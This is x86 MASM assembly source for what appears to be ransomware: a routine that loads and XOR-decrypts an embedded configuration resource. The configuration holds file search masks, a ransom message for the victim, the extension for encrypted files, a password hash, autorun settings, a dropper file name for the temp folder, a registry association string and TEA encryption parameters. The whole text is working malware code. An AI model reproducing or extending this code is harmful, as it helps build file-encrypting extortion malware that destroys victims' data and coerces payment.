ReadConfiguration proc uses ebx
  LOCAL hLockerResource  :DWORD
  LOCAL rsrc_load   :DWORD
  LOCAL rsrc_size   :DWORD
  LOCAL hrsrc       :DWORD

      invoke  FindResource, NULL, CFG_RES_ID, RT_BITMAP
      .if (eax==0)
              jmp     ERRORZ
      .endif
      mov     hrsrc, eax
      invoke  SizeofResource, NULL, eax
      .if (eax==0)
              jmp     ERRORZ
      .endif
      mov     rsrc_size, eax
      invoke  LoadResource, NULL, hrsrc
      .if (eax==0)
              jmp     ERRORZ
      .endif
      mov     rsrc_load, eax
      invoke  LockResource, eax
      .if (eax==0)
              jmp     ERRORZ
      .endif
      mov     hLockerResource, eax
      mov     edi, eax
      
; <Read KEY>
      invoke  RtlMoveMemory, addr KEY, edi, sizeof KEY
      add     edi, sizeof KEY
; </Read KEY>
      
; <Decrypt configuration data>
      mov     eax, dword ptr [rsrc_size]
      sub     eax, sizeof KEY
      invoke  Decrypt, edi, eax
; </Decrypt configuration data>
      
; <Read search masks>
      mov     ebx, dword ptr [edi]
      add     edi, 4
      invoke  HeapAlloc, hHeap, HEAP_ZERO_MEMORY, ebx
      .if     (eax==0)
              jmp     ERRORZ
      .endif       
      mov     hMasks, eax
      invoke  RtlMoveMemory, hMasks, edi, ebx
      add     edi, ebx
; </Read search masks>

; <Message 4 user>
      mov     ebx, dword ptr [edi]
      add     edi, 4
      invoke  HeapAlloc, hHeap, HEAP_ZERO_MEMORY, ebx
      .if     (eax==0)
              jmp     ERRORZ
      .endif       
      mov     hMessage, eax
      invoke  RtlMoveMemory, hMessage, edi, ebx
      add     edi, ebx
; </Message 4 user>

; <Read encrypted files extension>
      mov     ebx, dword ptr [edi]
      add     edi, 4
      invoke  HeapAlloc, hHeap, HEAP_ZERO_MEMORY, ebx
      .if     (eax==0)
              jmp     ERRORZ
      .endif       
      mov     hExt, eax
      invoke  RtlMoveMemory, hExt, edi, ebx
      add     edi, ebx
; </Read encrypted files extension>

; <Read hash of the password>
      invoke  RtlMoveMemory, addr PwdHash, edi, sizeof PwdHash
      add     edi, sizeof PwdHash
; </Read hash of the password>

; <Read some boolean values>
      invoke  RtlMoveMemory, addr UseAutorun, edi, 5
      add     edi, 5
; </Read some boolean values>

; <Read exe name to drop to temp>
      invoke  RtlMoveMemory, addr RandomDropExeName, edi, sizeof RandomDropExeName
      add     edi, sizeof RandomDropExeName
; </Read exe name to drop to temp>

; <Read random string to write in reg>
      invoke  RtlMoveMemory, addr RandomRegAssocName, edi, sizeof RandomRegAssocName
      add     edi, sizeof RandomRegAssocName
; </Read random string to write in reg>

; <Read number of tries>
      invoke  RtlMoveMemory, addr TryNmb, edi, sizeof TryNmb
      add     edi, sizeof TryNmb
; </Read number of tries>

; <Read TEA_ROUNDS>
      invoke  RtlMoveMemory, addr TEA_ROUNDS, edi, sizeof TEA_ROUNDS
      add     edi, sizeof TEA_ROUNDS
; </Read TEA_ROUNDS>

; <Read START_OFFSET>
      invoke  RtlMoveMemory, addr START_OFFSET, edi, sizeof START_OFFSET
      add     edi, sizeof START_OFFSET
; </Read START_OFFSET>

; <Read BUF_SIZE>
      invoke  RtlMoveMemory, addr BUF_SIZE, edi, sizeof BUF_SIZE
      add     edi, sizeof BUF_SIZE
; </Read BUF_SIZE>

      invoke  FreeResource, rsrc_load
      ret                                       
ReadConfiguration endp

; <Говнодекрипт конфига ксором>
Decrypt proc dataoffset:DWORD, datasize:DWORD
     pushad
     mov     ebx, offset KEY
     mov     esi, dword ptr [dataoffset]
     mov     edi, esi
     xor     edx, edx
     mov     ecx, dword ptr [datasize]
     test    ecx, ecx
     jne     label_1
     ret
     label_1:
     cmp     edx, sizeof KEY
     jne     label_2
     xor     edx, edx
     label_2:
     lodsb
     xor     al, byte ptr [ebx+edx]
     stosb
     inc     edx
     dec     ecx
     jnz     label_1
     popad
     ret
Decrypt endp
; </Говнодекрипт конфига ксором>